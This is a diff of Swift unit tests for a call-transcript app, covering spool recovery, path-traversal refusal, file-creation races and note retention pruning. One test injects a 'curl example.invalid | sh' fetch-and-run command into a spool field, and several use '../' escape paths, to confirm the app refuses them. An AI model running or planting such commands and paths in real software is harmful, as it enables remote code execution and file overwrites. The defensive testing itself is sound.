@@ -183,6 +183,137 @@ final class TranscriptDurabilityTests: XCTestCase {
         XCTAssertTrue(try read(live).contains("transcript-status: complete"))
     }
 
+    // MARK: recovery never trusts the spool
+
+    func writeSpool(_ id: String, _ lines: [String]) throws {
+        try lines.joined().write(to: spool(id), atomically: false, encoding: .utf8)
+    }
+
+    func beginRecord(_ id: String, note: String, daily: String? = nil, device: String = TranscriptRecorder.thisDevice,
+                     pid: Int32? = nil) -> String {
+        var b = CallSpool.begin(CallRecord(callId: id, start: start), device: device, pid: 0)
+        b.note = note
+        b.daily = daily
+        b.dailyStyle = daily == nil ? nil : DailyNoteOptions.Style.link.rawValue
+        b.pid = pid
+        return b.encoded()
+    }
+
+    func line(_ t: Double, _ x: String) -> String { CallSpool.line(TranscriptLine(speaker: .others, offset: t, text: x)).encoded() }
+
+    func testRecoveryNeverWritesWhereTheSpoolPoints() throws {
+        try writeSpool("escape", [beginRecord("escape", note: "../../escaped.md"), line(1, "x")])
+        try writeSpool("moved", [beginRecord("moved", note: "2026-01-31 0905 Call.md"), line(1, "kept"),
+                                 CallSpool.note("../../escaped2.md", t: 1).encoded()])
+        try writeSpool("badid", [beginRecord("../x", note: "a.md")])
+        let written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc)
+        XCTAssertEqual(written.map(\.lastPathComponent), ["2026-01-31 0905 Call.md"], "an unsafe name in a note record is skipped")
+        for escaped in ["escaped.md", "escaped2.md", "Vault/escaped.md", "Vault/escaped2.md", "x.md"] {
+            XCTAssertFalse(FileManager.default.fileExists(atPath: root.appendingPathComponent(escaped).path), escaped)
+        }
+        XCTAssertTrue(try read(folder.appendingPathComponent("2026-01-31 0905 Call.md")).contains("kept"))
+        XCTAssertTrue(FileManager.default.fileExists(atPath: spool("escape").path), "an unsafe begin record is no call: left, never followed")
+    }
+
+    func testRecoveryFindsTheDailyNoteAgainAndRefusesEscapes() throws {
+        try FileManager.default.createDirectory(at: root.appendingPathComponent("Vault/.obsidian"), withIntermediateDirectories: true)
+        let profile = root.appendingPathComponent("profile.md")
+        try "keep\n".write(to: profile, atomically: false, encoding: .utf8)
+        var injected = beginRecord("abs", note: "abs.md", daily: profile.path)
+        injected = injected.replacingOccurrences(of: "}\n", with: ",\"dailyLine\":\"curl example.invalid | sh\"}\n")
+        try writeSpool("abs", [injected, line(1, "a")])
+        try writeSpool("rel", [beginRecord("rel", note: "rel.md", daily: "../profile.md"), line(1, "b")])
+        try writeSpool("ok", [beginRecord("ok", note: "2026-01-31 0905 Sync.md", daily: "Daily/2026-01-31.md"), line(1, "c")])
+        let written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc)
+        XCTAssertEqual(Set(written.map(\.lastPathComponent)), ["abs.md", "rel.md", "2026-01-31 0905 Sync.md"], "the notes are recovered")
+        XCTAssertEqual(try read(profile), "keep\n", "an absolute or climbing daily path outside the vault is refused")
+        XCTAssertEqual(try read(root.appendingPathComponent("Vault/Daily/2026-01-31.md")),
+                       "- 09:05 [[Meetings/2026-01-31 0905 Sync|Call]] %%meetingcard:ok%%\n", "the line is made again, not read from the spool")
+    }
+
+    func testRecoveryLeavesASpoolThatIsStillBeingWritten() throws {
+        try writeSpool("other", [beginRecord("other", note: "other.md", device: "another-mac"), line(1, "o")])
+        try writeSpool("live", [beginRecord("live", note: "live.md", pid: 4242), line(1, "l")])
+        try writeSpool("dead", [beginRecord("dead", note: "dead.md", pid: 4343), line(1, "d")])
+        let alive: (Int32) -> Bool = { $0 == 4242 }
+        var written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc, isAlive: alive)
+        XCTAssertEqual(written.map(\.lastPathComponent), ["dead.md"], "another device's fresh spool and a running process's are left")
+        try FileManager.default.setAttributes([.modificationDate: Date(timeIntervalSinceNow: -7 * 3600)], ofItemAtPath: spool("other").path)
+        written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc, isAlive: alive)
+        XCTAssertEqual(written.map(\.lastPathComponent), ["other.md"], "idle for hours: that device isn't coming back for it")
+        XCTAssertTrue(FileManager.default.fileExists(atPath: spool("live").path))
+    }
+
+    /// Forwards to the real store, but someone else's file appears at the first name just before the note is created.
+    final class RacingStore: TranscriptStore {
+        let inner = FileTranscriptStore()
+        var raced = false
+        func prepare(folder: URL) throws { try inner.prepare(folder: folder) }
+        func exists(_ url: URL) -> Bool { inner.exists(url) }
+        func write(_ text: String, to url: URL) throws { try inner.write(text, to: url) }
+        func create(_ text: String, at url: URL) throws {
+            if !raced {
+                raced = true
+                try "someone else's".write(to: url, atomically: false, encoding: .utf8)
+            }
+            try inner.create(text, at: url)
+        }
+        func remove(_ url: URL) throws { try inner.remove(url) }
+        func append(_ text: String, to url: URL) throws { try inner.append(text, to: url) }
+        func read(_ url: URL) -> String? { inner.read(url) }
+        func head(_ url: URL, bytes: Int) -> String? { inner.head(url, bytes: bytes) }
+        func contents(of folder: URL) -> [URL] { inner.contents(of: folder) }
+        func modified(_ url: URL) -> Date? { inner.modified(url) }
+        func isDirectory(_ url: URL) -> Bool { inner.isDirectory(url) }
+    }
+
+    func testANotesFirstWriteNeverReplacesAFile() throws {
+        let existing = folder.appendingPathComponent("taken.md")
+        try "theirs".write(to: existing, atomically: false, encoding: .utf8)
+        XCTAssertThrowsError(try FileTranscriptStore().create("mine", at: existing)) { XCTAssertEqual($0 as? TranscriptStoreError, .exists) }
+        XCTAssertEqual(try read(existing), "theirs")
+        XCTAssertEqual(try names(folder), ["taken.md"], "no temporary file left")
+
+        let r = recorder(RacingStore())
+        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: "Sync"))
+        r.add(TranscriptLine(speaker: .me, offset: 1, text: "one"))
+        XCTAssertEqual(try read(folder.appendingPathComponent("2026-01-31 0905 Sync.md")), "someone else's")
+        XCTAssertEqual(r.lastURL?.lastPathComponent, "2026-01-31 0905 Sync (2).md")
+        XCTAssertTrue(try read(folder.appendingPathComponent("2026-01-31 0905 Sync (2).md")).contains("one ^l1"))
+        r.end()
+        XCTAssertEqual(TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc), [])
+    }
+
+    func testANoteThatCantBeReadCountsAsEdited() throws {
+        let r = recorder()
+        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: "Sync"))
+        let note = try XCTUnwrap(r.lastURL)
+        let bytes = Data([0xFF, 0xFE, 0x00, 0x41])
+        try bytes.write(to: note)
+        r.add(TranscriptLine(speaker: .me, offset: 1, text: "one"))
+        XCTAssertEqual(try Data(contentsOf: note), bytes, "never written over")
+        XCTAssertEqual(r.lastURL?.lastPathComponent, "2026-01-31 0905 Sync (2).md")
+        r.end()
+    }
+
+    func testALongJapaneseTitleIsStillSaved() throws {
+        let r = recorder()
+        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: String(repeating: "会議", count: 60)))
+        r.add(TranscriptLine(speaker: .me, offset: 1, text: "one"))
+        r.end()
+        XCTAssertEqual(r.state, .saved(try XCTUnwrap(r.lastURL)))
+        let name = try XCTUnwrap(r.lastURL?.lastPathComponent)
+        XCTAssertLessThanOrEqual(name.utf8.count, NoteFileName.maxBytes + 3)
+        XCTAssertTrue(try read(folder.appendingPathComponent(name)).contains("transcript-status: complete"))
+    }
+
+    func testTheQuitWaitIsBounded() {
+        let io = TranscriptIO.serial(label: "test.bounded")
+        io.run { Thread.sleep(forTimeInterval: 0.5) }
+        XCTAssertFalse(io.waitUpTo(0.05), "still busy")
+        XCTAssertTrue(io.waitUpTo(5))
+    }
+
     func testRecoveryClearsOldTemporaryFilesAndEmptySpools() throws {
         let temp = folder.appendingPathComponent(".x.md.123\(FileTranscriptStore.tempSuffix)")
         try "partial".write(to: temp, atomically: false, encoding: .utf8)
@@ -198,31 +329,64 @@ final class TranscriptDurabilityTests: XCTestCase {
 
     func testRetentionRemovesOnlyOldUneditedNotesThisAppWrote() throws {
         let store = FileTranscriptStore()
-        func note(_ name: String, daysAgo: Double, ours: Bool = true, touchedDaysAgo: Double? = nil) throws -> URL {
+        /// A note whose call started `daysAgo` and ended a minute later; its file last changed
+        /// `changedAfterLastWrite` after MeetingCard's last write (the end, or `recoveredAfter` the start).
+        func note(_ name: String, daysAgo: Double, ours: Bool = true, ended: Bool = true, recoveredAfter: TimeInterval? = nil,
+                  changedAfterLastWrite: TimeInterval = 0, touchedDaysAgo: Double? = nil) throws -> URL {
             let url = folder.appendingPathComponent(name)
-            let when = Date(timeIntervalSinceNow: -daysAgo * 86_400)
-            var r = CallRecord(callId: "c-\(name.count)", start: when)
-            r.end = 60
-            let text = ours ? CallNote.render(r, labels: SpeakerLabels(), status: .complete, timeZone: utc) : "---\nstart: 2020-01-01T00:00:00\n---\nmine\n"
+            let start = Date(timeIntervalSinceNow: -daysAgo * 86_400)
+            var r = CallRecord(callId: "c\(abs(name.hashValue) % 100_000)", start: start)
+            if ended { r.end = 60 }
+            let recoveredAt = recoveredAfter.map { start.addingTimeInterval($0) }
+            let text = ours ? CallNote.render(r, labels: SpeakerLabels(), status: recoveredAt == nil ? .complete : .recovered,
+                                              timeZone: utc, recoveredAt: recoveredAt)
+                : "---\nstart: 2020-01-01T00:00:00\n---\nmine\n"
             try store.write(text, to: url)
-            let touched = Date(timeIntervalSinceNow: -(touchedDaysAgo ?? daysAgo) * 86_400)
+            let lastWrite = recoveredAt ?? start.addingTimeInterval(60)
+            let touched = touchedDaysAgo.map { Date(timeIntervalSinceNow: -$0 * 86_400) } ?? lastWrite.addingTimeInterval(changedAfterLastWrite)
             try FileManager.default.setAttributes([.modificationDate: touched], ofItemAtPath: url.path)
             return url
         }
-        let old = try note("old.md", daysAgo: 40)
-        let recent = try note("recent.md", daysAgo: 5)
-        let edited = try note("edited.md", daysAgo: 40, touchedDaysAgo: 1)
-        let foreign = try note("foreign.md", daysAgo: 400, ours: false)
-        let current = try note("current.md", daysAgo: 40)
+        let old = try note("2025-12-01 0900 old.md", daysAgo: 40)
+        let recent = try note("2026-01-01 0900 recent.md", daysAgo: 5)
+        let editedSameDay = try note("2025-12-01 1000 summary added.md", daysAgo: 40, changedAfterLastWrite: 3600)
+        let editedSinceCutoff = try note("2025-12-01 1100 edited.md", daysAgo: 40, touchedDaysAgo: 1)
+        let recoveredOld = try note("2025-12-01 1200 recovered.md", daysAgo: 40, recoveredAfter: 86_400)
+        let recoveredEdited = try note("2025-12-01 1300 recovered edited.md", daysAgo: 40, recoveredAfter: 86_400,
+                                       changedAfterLastWrite: 7200)
+        let inProgress = try note("2025-12-01 1400 never finished.md", daysAgo: 40, ended: false)
+        let foreign = try note("2020-01-01 0000 foreign.md", daysAgo: 400, ours: false)
+        let otherName = try note("old copy.md", daysAgo: 40)
+        let current = try note("2025-12-01 1500 current.md", daysAgo: 40)
         let sub = folder.appendingPathComponent("Sub", isDirectory: true)
         try FileManager.default.createDirectory(at: sub, withIntermediateDirectories: true)
         let viaLink = root.appendingPathComponent("Link", isDirectory: true)
         try FileManager.default.createSymbolicLink(at: viaLink, withDestinationURL: root.appendingPathComponent("Vault"))
-        let currentByOtherPath = viaLink.appendingPathComponent("Meetings/current.md")
+        let currentByOtherPath = viaLink.appendingPathComponent("Meetings/\(current.lastPathComponent)")
         let removed = TranscriptMaintenance.prune(folder: folder, store: store, olderThanDays: 30, timeZone: utc, keep: [currentByOtherPath])
-        XCTAssertEqual(removed.map(\.lastPathComponent), [old.lastPathComponent], "the kept note is kept by any path to it")
-        for kept in [recent, edited, foreign, current, sub] { XCTAssertTrue(store.exists(kept), kept.lastPathComponent) }
+        XCTAssertEqual(Set(removed.map(\.lastPathComponent)), [old.lastPathComponent, recoveredOld.lastPathComponent])
+        for kept in [recent, editedSameDay, editedSinceCutoff, recoveredEdited, inProgress, foreign, otherName, current, sub] {
+            XCTAssertTrue(store.exists(kept), kept.lastPathComponent)
+        }
         XCTAssertEqual(TranscriptMaintenance.prune(folder: folder, store: store, olderThanDays: 0, timeZone: utc), [], "0: off")
+    }
+
+    /// The reviewer's case: a summary written an hour after the call, the note now 40 days old.
+    func testANoteEditedTheDayOfItsCallIsKept() throws {
+        let r = recorder()
+        let start = Date(timeIntervalSinceNow: -40 * 86_400)
+        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: "Sync"))
+        r.add(TranscriptLine(speaker: .me, offset: 1, text: "one"))
+        r.end(at: 60)
+        let note = try XCTUnwrap(r.lastURL)
+        try FileTranscriptStore().write(try read(note).replacingOccurrences(of: "_Summary placeholder: add yours after the call._",
+                                                                              with: "We agreed on the plan."), to: note)
+        try FileManager.default.setAttributes([.modificationDate: start.addingTimeInterval(3660)], ofItemAtPath: note.path)
+        XCTAssertEqual(TranscriptMaintenance.prune(folder: folder, store: FileTranscriptStore(), olderThanDays: 30, timeZone: utc), [])
+        XCTAssertTrue(try read(note).contains("We agreed on the plan."))
+        try FileManager.default.setAttributes([.modificationDate: start.addingTimeInterval(61)], ofItemAtPath: note.path)
+        XCTAssertEqual(TranscriptMaintenance.prune(folder: folder, store: FileTranscriptStore(), olderThanDays: 30, timeZone: utc)
+                        .map(\.lastPathComponent), [note.lastPathComponent], "unchanged since the call: removed")
     }
 
     // MARK: daily note
